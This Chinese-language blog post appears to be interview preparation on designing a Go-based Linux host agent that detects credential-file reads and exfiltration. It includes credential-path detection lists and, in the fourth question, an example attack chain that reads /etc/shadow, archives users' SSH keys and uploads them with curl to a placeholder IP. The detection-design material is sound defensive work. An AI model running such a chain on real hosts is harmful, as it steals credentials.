---
title: Go主机安全面试：Linux 凭据文件访问与外传检测
date: 2026-08-16 17:01:12
categories:
- Interview
tags:
- go
- interview
- security
- hids
- edr
- linux
- credential
---

# Go 主机安全面试：Linux 凭据文件访问与外传检测

Linux 主机被入侵后，攻击者常会先找凭据：读 `/etc/shadow`、打包 `~/.ssh/id_rsa`、翻 `.aws/credentials`、导出 Kubernetes token，再通过 `curl`、`scp`、DNS 或自建隧道外传。面试官通常会追问：哪些读文件行为值得告警？怎么区分安全巡检、备份和攻击？Go Agent 如何在不读取敏感明文的前提下给出可解释证据？

## 岗位场景

```text
Linux 主机
  -> 采集敏感文件 open/read、进程启动、用户、父进程、网络连接和压缩归档行为
  -> 标准化路径、文件类型、访问者身份、命令行、容器和登录上下文
  -> 识别异常读取 /etc/shadow、SSH 私钥、云凭证、Kubernetes token 和浏览器凭据
  -> 关联 Web RCE、提权、批量打包、外联上传和痕迹清理
  -> 输出不泄露凭据内容的告警证据，并支持客户复盘误报
```

这类题考的是 Linux 权限模型、文件审计、攻击链还原、敏感数据最小化、误报治理和 Go 侧低开销事件关联设计。

## 高频面试题

### 1. 凭据文件访问检测为什么不能只看 `/etc/shadow`？

简洁答案：`/etc/shadow` 很重要，但攻击者还会找 SSH 私钥、云厂商凭据、Kubernetes token、数据库配置和应用 `.env` 文件。只盯一个路径会漏掉大量横向移动入口。

关键知识点：

- Linux 本地账号口令散列主要在 `/etc/shadow`，通常只有 root 或特权进程能读。
- SSH 私钥常见于 `~/.ssh/id_rsa`、`id_ed25519`，一旦泄露可用于免密登录。
- 云凭据可能在 `~/.aws/credentials`、`~/.config/gcloud`、环境变量或业务配置中。
- 容器内常见 token 路径是 `/var/run/secrets/kubernetes.io/serviceaccount/token`。
- 业务系统的 `.env`、`config.yaml`、数据库连接串同样属于高价值凭据。

Go 落地思路：

- 维护一份小而明确的敏感路径分类表，而不是把所有配置文件都当高危。
- 事件只记录路径类别、owner、权限、访问进程和 hash 摘要，不上传文件内容。
- 规则按“文件敏感度 + 访问者身份 + 后续行为”评分。

```go
type SensitiveFileClass string

const (
	CredLocalAccount SensitiveFileClass = "local_account"
	CredSSHKey       SensitiveFileClass = "ssh_private_key"
	CredCloudToken   SensitiveFileClass = "cloud_token"
	CredK8sToken     SensitiveFileClass = "k8s_token"
)
```

### 2. Linux 上如何采集“谁读了敏感文件”？

简洁答案：可用 auditd/eBPF 采集 `openat`、`read`、`execve` 等事件，inotify 只能看路径变化，通常无法可靠回答“哪个进程读了文件”。

关键知识点：

| 来源 | 适合用途 | 局限 |
| --- | --- | --- |
| auditd | 文件访问审计、进程和用户关联 | 规则量大时有性能压力 |
| eBPF | 低开销采集 syscall 和进程上下文 | 需要处理内核兼容和权限 |
| fanotify | 文件访问拦截或通知 | 部署复杂，误用会影响 IO |
| inotify | 文件创建、修改、删除 | 缺少读取者进程上下文 |
| 周期扫描 | 权限和基线变化兜底 | 实时性弱，不能证明读取行为 |

Go 落地思路：

- 采集层统一输出 `file_access` 事件，字段包括 `pid`、`ppid`、`uid`、`path`、`op`、`comm`、`argv`。
- 进程上下文要带 `start_time`，避免 PID 复用导致证据串错。
- 采集失败要上报能力状态，例如 `audit_disabled`、`ebpf_unsupported`、`permission_denied`。

### 3. 哪些进程读取凭据文件更可疑？

简洁答案：来自 Web 进程、临时目录脚本、异常 shell、未知二进制、普通业务用户的批量读取更可疑；系统认证组件、安全软件、备份和配置管理工具则需要结合基线判断。

关键知识点：

- 合法进程包括 `sshd`、`sudo`、`passwd`、`chage`、`useradd`、备份 Agent 和合规扫描器。
- 高风险父进程包括 `nginx`、`php-fpm`、`java` Web 服务拉起的 `sh`、`python`、`perl`、`curl`。
- 从 `/tmp`、`/dev/shm`、Web 上传目录、隐藏目录执行的二进制风险更高。
- 单次读取不一定恶意，批量遍历多个用户家目录更值得关注。

Go 落地思路：

- 把进程画像拆成可解释 reason code，例如 `web_parent`、`temp_exec_path`、`multi_home_ssh_key_read`。
- 使用短窗口聚合：同一进程 5 分钟内读取多个敏感路径时升高风险。
- 对合法工具使用窄白名单：限定进程路径、签名或 hash、执行用户、主机角色和时间窗口。

```go
type CredentialAccess struct {
	HostID    string
	PID       int
	StartTime int64
	User      string
	Process   string
	PathClass SensitiveFileClass
	Reasons   []string
}
```

### 4. 如何识别“读取凭据后外传”的攻击链？

简洁答案：把敏感文件读取和后续压缩、编码、网络上传、DNS 隧道或 SSH/SCP 连接放到同一时间线里看；单点文件读取只是风险，读完马上外联才更像攻击。

关键知识点：

- 常见链路是 `cat/tar/zip/base64` 打包凭据，再由 `curl/wget/scp/python` 上传。
- 攻击者可能先读取 SSH 私钥，再连接内网其他主机完成横向移动。
- DNS 隧道、SSH 隧道、异常端口外联都可能承载凭据外传。
- 进程退出后 `/proc` 证据会消失，必须保留事件快照。

Go 落地思路：

- 建立 5 到 15 分钟关联窗口：`file_access -> archive_or_encode -> network_upload`。
- 用 `host + session_id + process_tree + user` 串联跨进程行为。
- 告警详情展示时间线和证据强度，而不是只显示“读取了某文件”。

```text
php-fpm -> sh -> cat /etc/shadow
  -> tar /home/*/.ssh
  -> curl -X POST http://203.0.113.10/upload
  => 凭据访问与外传高危链路
```

### 5. 如何在不泄露客户凭据内容的前提下保留证据？

简洁答案：只采集元数据和必要摘要，不上传文件正文、私钥、token 或完整配置内容；告警要能证明“访问了什么类型的敏感文件”，但不能把敏感值带出主机。

关键知识点：

- 安全产品本身不能变成凭据收集器。
- 路径、owner、mode、文件大小、mtime、访问进程、命令行和事件时间通常足够支撑判断。
- 命令行里也可能含 token，要做脱敏。
- Debug dump 要有权限控制、保留期限和审计记录。

Go 落地思路：

- 对路径做分类和必要脱敏，例如家目录用户名可按策略 hash。
- 对命令行参数做 token pattern redaction。
- 本地计算摘要时只用于去重或完整性证明，不把明文内容入日志。

```go
func redactArg(arg string) string {
	keys := []string{"token=", "password=", "secret=", "access_key="}
	lower := strings.ToLower(arg)
	for _, k := range keys {
		if strings.Contains(lower, k) {
			return k + "<redacted>"
		}
	}
	return arg
}
```

### 6. 如何降低凭据访问规则的误报？

简洁答案：不要把所有敏感文件读取都直接高危告警，要结合主机角色、执行用户、进程基线、时间窗口、后续网络行为和客户维护的可信任务来分层评分。

关键知识点：

| 场景 | 常见合法原因 | 降噪方式 |
| --- | --- | --- |
| `/etc/shadow` 被读取 | 账号管理、合规扫描 | 限定可信进程和执行窗口 |
| SSH 私钥被读取 | 正常登录、备份 | 区分读取单个 owner 私钥和批量遍历 |
| 云凭据被读取 | 云 SDK、部署脚本 | 校验父进程、工作目录和主机角色 |
| K8s token 被读取 | Pod 内访问 API | 结合容器身份和目标 API |

Go 落地思路：

- 评分模型先保持简单：敏感度、异常进程、批量读取、后续外联四类因子足够起步。
- 白名单要有边界：进程路径、用户、路径类别、主机标签和过期时间。
- 对同一指纹聚合告警，指纹可包含 `user + process + path_class + process_tree`。

### 7. Agent 资源有限时，如何控制性能和内存？

简洁答案：只对高价值路径布点，对候选事件做本地聚合和短窗口关联；不要全量扫描所有用户目录、不要读取凭据内容、不要把每次 `read` 都上报服务端。

关键知识点：

- 文件访问事件可能很密，尤其是备份、扫描和容器节点。
- 读取 `/home/*` 全量目录成本高，也可能触碰隐私边界。
- eBPF/audit 事件需要背压，队列满时要记录丢弃指标。
- 关联窗口不能无限增长，进程退出后也要按 TTL 清理。

Go 落地思路：

- 用 trie 或前缀表匹配敏感路径，避免大量正则。
- 对同一 `pid + path_class` 在窗口内合并计数，只上报首次和风险升级。
- 设置有界队列、TTL cache 和降级策略。

```go
select {
case accessEvents <- ev:
	metrics.Accepted.Add(1)
default:
	metrics.Dropped.Add(1)
}
```

### 8. 客户反馈“这是正常巡检”，Go 研发怎么排查？

简洁答案：先确认告警证据链是否完整，再核对进程路径、执行用户、任务计划、主机角色和后续外联；如果确实是正常巡检，补充窄范围白名单和回放样本，而不是删除规则。

关键知识点：

1. 看访问的路径类别、进程树、用户、工作目录和命令行。
2. 确认是否命中批量读取、临时目录执行、Web 父进程或后续上传。
3. 核对客户是否有固定合规扫描、备份、资产盘点或密钥轮换任务。
4. 检查规则版本、采集源能力和字段是否缺失。
5. 用同一套规则离线 replay，确认阈值或白名单调整不会放过真实攻击链。

Go 落地思路：

- 告警对象保留 `rule_version`、`collector_capability`、`suppression_reason`。
- 排障包只导出元数据和脱敏命令行。
- 客户白名单要可过期、可审计、可按规则版本回归验证。

## 通俗答案

凭据访问检测不是“看到有人读配置文件就报警”，而是判断这个读取行为是否超出了主机角色和进程身份的正常边界。正常巡检通常有固定工具、固定时间、固定范围；攻击者更常从 Web RCE、异常 shell 或临时目录程序开始，批量读取多类凭据，并很快打包或外传。

最小可用链路可以这样理解：

```text
异常入口或陌生进程
  -> 读取 shadow / SSH 私钥 / 云凭据 / K8s token
  -> 打包、编码或批量遍历用户目录
  -> curl/scp/DNS/SSH 隧道外传或横向连接
  -> 告警输出路径类别、访问者、时间线和脱敏证据
```

## Go 落地要点

- 事件结构先统一，再做规则：`file_access`、`process_exec`、`network_connect`、`archive_command` 不要各自孤立。
- 敏感路径分类要小而准，优先覆盖账号、SSH、云凭据、K8s token 和业务密钥配置。
- 关联时使用 `pid + start_time + process_tree + session_id`，避免 PID 复用和跨会话误关联。
- 降噪先用可解释评分，不急着引入复杂模型。
- 证据最小化是产品边界：不上传凭据内容，不在日志打印 secret。
- 指标要能回答 Agent 是否健康：事件量、队列丢弃、关联命中率、规则耗时、脱敏次数。

## 学习要点

- Linux 文件权限、UID/GID、capability 和 `sudo` 行为。
- auditd/eBPF/fanotify/inotify 对文件访问证据强度的差异。
- `/proc/<pid>` 进程上下文、PID 复用和进程树关联。
- 凭据类型：本地账号、SSH key、云厂商 key、Kubernetes service account、应用配置。
- 告警降噪：资产角色、可信任务、白名单边界、时间窗口和攻击链补证。
- 安全产品的数据最小化和敏感信息脱敏设计。

## 小练习/复盘题

1. 设计一个 `CredentialAccessEvent` 结构体，字段要能支持路径分类、进程关联和脱敏展示。
2. 写一个简单函数，把路径映射为 `local_account`、`ssh_private_key`、`cloud_token`、`k8s_token` 或 `unknown`。
3. 给出 5 条 reason code，用来解释为什么一次凭据访问是高风险。
4. 如果 `tar` 在 1 分钟内读取 200 个用户的 `.ssh/id_rsa`，你会如何聚合和告警？
5. 客户的备份 Agent 每天凌晨读取 SSH 私钥目录，白名单应该包含哪些边界条件？
6. 如果采集源只剩 inotify，没有 audit/eBPF，你还能给出哪些低置信度证据？
7. 设计一个不泄露 token 明文的 debug dump 格式。
8. 面对高并发服务器，如何证明这条规则没有明显增加 CPU、内存和 IO 压力？
